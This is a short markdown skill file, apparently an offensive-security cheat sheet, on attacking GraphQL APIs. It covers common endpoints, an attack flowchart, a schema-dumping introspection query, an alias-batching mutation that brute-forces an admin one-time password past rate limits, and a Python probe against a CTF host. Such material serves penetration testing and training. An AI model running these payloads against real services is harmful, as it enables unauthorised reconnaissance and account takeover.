# GraphQL Security & Exploitation (skills/web/graphql-attacks.md)

## 1. Signatures & Common Endpoints

- **Common Paths**: `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, `/graph`.
- **Query Structure**: POST request with JSON `{"query": "...", "variables": {...}}`.

---

## 2. Decision Flowchart & Attack Matrix

```text
               Identify GraphQL Endpoint
                          │
            ┌─────────────┴─────────────┐
   Introspection Enabled?        Introspection Disabled?
            │                               │
   ┌────────┴────────┐             ┌────────┴────────┐
Schema Dump (Full Recon)      Field Suggestion / Fuzzy Probe
           │                                │
           └──────────────┬─────────────────┘
                          │
              ┌───────────┴───────────┐
     Batching / Alias Attack   Injection in Query Variables
     (Bypass OTP / Rate Limit)  (SQLi / NoSQL / Command Injection)
```

---

## 3. Core Exploitation Techniques

### 3.1 Full Schema Introspection Query
Send query to dump entire API schema (types, queries, mutations):
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}
```

### 3.2 Alias Batching (Bypass Rate Limits / Brute Force OTP)
Send 100+ operations in a single HTTP POST request:
```graphql
mutation {
  trial001: login(username: "admin", otp: "0001") { token }
  trial002: login(username: "admin", otp: "0002") { token }
  trial003: login(username: "admin", otp: "0003") { token }
}
```

---

## 4. Python GraphQL Automated Triage Snippet
```python
import requests

url = "http://target.ctf/graphql"
q = 'query { __schema { queryType { name } types { name } } }'
res = requests.post(url, json={"query": q})
if "__schema" in res.text:
    print("[+] Introspection is ENABLED! Dump full schema.")
else:
    print("[-] Introspection disabled. Test field suggestions.")
```
